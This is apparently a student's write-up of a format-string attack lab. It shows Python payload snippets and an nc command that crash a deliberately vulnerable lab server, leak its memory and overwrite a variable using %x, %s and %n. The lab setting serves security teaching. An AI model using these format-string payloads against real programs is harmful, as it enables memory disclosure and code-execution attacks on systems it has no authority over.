# Format-string Attack Lab | Alex Baron

Some programs allow users to provide the entire or part of the contents in a format string. If such contents are not sanitized, malicious users can use this opportunity to get the program to run arbitrary code. A problem like this is called format string vulnerability.

## Task1: Crashing the Program

It is possibile to make the program crash with the following input:
> echo %s | nc 10.9.0.5 9090

In this case, the program will interpret the %s as a pointer to a strin, starting from the location of the buffer. If it gets an invalid address the program will try to access that address and this will cause the program to crash.

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A

By writing the following content to the badfile it is possible to notice that after 64 %x our input will show up.

```py
content[0:4] = (0x99999999).to_bytes(4, byteorder='little')
s = ("%x "*64).encode('latin-1')
content[4:4+len(s)] = s
```

### Task 2.B

To print out the secret message, we need to place its address, in binary form, in the format string and read that address with %s.

```py
content[0:4] = (0x080ac2c8).to_bytes(4, byteorder='little')
s = ("%x "*63 + "%s").encode('latin-1')
content[4:4+len(s)] = s
```

## Task 3: Modifying the Server Program’s Memory

### Task 3.A

With %n we can write into the target variable. In particular, %n writes the number of characters in the address given as argument.

```py
content[0:4] = (0x080da068).to_bytes(4, byteorder='little')
s = ("%x "*63 + "%n").encode('latin-1')
content[4:4+len(s)] = s
```

### Task 3.B

In this task we first need to put into the stack the address of the target variable that are 4bytes. Then, to write 0x5000 which is 20480, we can add a width of 20476 (considering the first 4 bytes of the address) and at the end use %64$n. The latter format directly access the 64th parameter (we know that our address resides in the 64th position) on stack and write the address there with %n.

```py
content[0:4] = (0x080da068).to_bytes(4, byteorder='little')
s = ("%20476d" + "%64$n").encode('latin-1') #%64$08n
content[4:4+len(s)] = s
```
